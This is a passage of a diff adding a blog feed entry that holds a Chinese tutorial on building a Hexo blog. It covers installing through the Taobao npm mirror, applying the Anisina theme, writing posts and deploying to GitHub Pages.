+<p>创建一个hexo文件夹，本文以E盘根目录为例。<br>打开gitshell  (gitbash)。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ cd e:/hexo</div><div class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org</div><div class="line">$ hexo init blog</div><div class="line">$ cd blog</div><div class="line">$ cnpm install</div></pre></td></tr></table></figure></p>
+<p>上面安装命令使用了taobao的文件源，便于国内安装。<br>此时已在E:\Hexo\blog\ 下配置好建立网站所需所有文件。<br>使用下面命令部署本地博客。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo g </div><div class="line">$ hexo s</div></pre></td></tr></table></figure></p>
+<p>浏览器输入<a href="localhost:4000" target="_blank" rel="external">localhost:4000</a>以查看本地博客。</p>
+</blockquote>
+<hr>
+<h2 id="自定义博客内容"><a href="#自定义博客内容" class="headerlink" title="自定义博客内容"></a>自定义博客内容</h2><h4 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h4><blockquote>
+<p>以本博客为例，使用的<a href="https://haojen.github.io/" target="_blank" rel="external">Haojen Ma</a>基于<a href="http://huangxuan.me/" target="_blank" rel="external">Hux</a>的博客主题修改的<a href="http://haojen.github.io/2016/08/06/Anisina-%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#undefined" target="_blank" rel="external">Anisina</a>主题</p>
+<ul>
+<li><p>下载主题文件</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git clone https://github.com/Haojen/hexo-theme-Anisina.git</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后将 clone 下的文件夹拷贝到 E:\Hexo\blog\themes</p>
+</li>
+<li>拷贝 Anisina 文件夹下的 <code>_config.yml</code> 替换 hexo 默认的 _config.yml</li>
+<li>文本编辑器打开 <code>_config.yml</code>，将其中相关属性修改为自己的内容,并添加个性化内容，具体参考该<a href="http://haojen.github.io/2016/08/06/Anisina-%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#undefined" target="_blank" rel="external">主题使用教程</a>。<br>主题使用教程中有添加图床、评论的方法。</li>
+<li>配置完成后本地查看调试。<pre><code>$ hexo g 
+$ hexo s
+</code></pre></li>
+<li>浏览器输入<a href="localhost:4000" target="_blank" rel="external">localhost:4000</a>以查看</li>
+</ul>
+</blockquote>
+<hr>
+<h4 id="添加博客内容"><a href="#添加博客内容" class="headerlink" title="添加博客内容"></a>添加博客内容</h4><pre><code>$ hexo n &quot;my new post&quot;#写文章 
+</code></pre><blockquote>
+<ul>
+<li>其中my new post为文章标题，执行命令后，会在项目\source_posts中生成my new post.md文件，用文本编辑器打开即可编写。</li>
+<li>文本内容使用Markdown标记语言编写。语法以及专业编写工具可参考<a href="http://www.jianshu.com/p/1e402922ee32/" target="_blank" rel="external">Markdown——入门指南</a>。</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="将博客部署至github-page"><a href="#将博客部署至github-page" class="headerlink" title="将博客部署至github page"></a>将博客部署至github page</h2><blockquote>
+<ul>
+<li><p>浏览器登陆github，在个人页面<code>new repository</code></p>
+<blockquote>
+<ul>
+<li>Repository name一栏填写<code>gitname</code>.github.io<br><code>gitname</code>为自己github账号的名字,同时该Repository name即为自己博客的地址</li>
+<li>description随便填写</li>
+<li>Create Repository完成创建</li>
+</ul>
+</blockquote>
+</li>
+<li><p>打开配置文件<code>_config.xml</code>，修改添加以下内容。<br>下面代码中<code>githubname</code>为自己github账号的名字（先Ctrl+F查找文件中是否有<code>deploy</code>选项）：</p>
+</li>
+</ul>
+<blockquote>
+<p>deploy:<br>    type: git<br>    repo: git@github.com:githubname/githubname.github.io.git<br>    branch: master</p>
+</blockquote>
+<ul>
+<li><p>打开返回命令窗口，完成部署。</p>
+<pre><code>$ hexo d
+</code></pre></li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="http://www.jianshu.com/p/05289a4bc8b2" target="_blank" rel="external">如何搭建一个独立博客——简明Github Pages与Hexo教程</a></li>
+<li><a href="http://jiji262.github.io/2016/04/15/2016-04-15-hexo-github-pages-blog/" target="_blank" rel="external">手把手教你使用Hexo + Github Pages搭建个人独立博客</a></li>
+<li><a href="http://chitanda.me/2015/06/11/tips-for-setup-hexo/" target="_blank" rel="external">hexo博客搭建时遇到的一些问题</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;配置工具&quot;&gt;&lt;a href=&quot;#配置工具&quot; class=&quot;headerlink&quot; title=&quot;配置工具&quot;&gt;&lt;/a&gt;配置工具&lt;/h2&gt;&lt;h4 id=&quot;安装github工具&quot;&gt;&lt;a href=&quot;#安装github工具&quot; class=&quot;headerlink&quot; titl
+    
+    </summary>
+    
+    
+      <category term="blog" scheme="http://jooop.github.io/tags/blog/"/>
+    
+  </entry>
+  
+</feed>
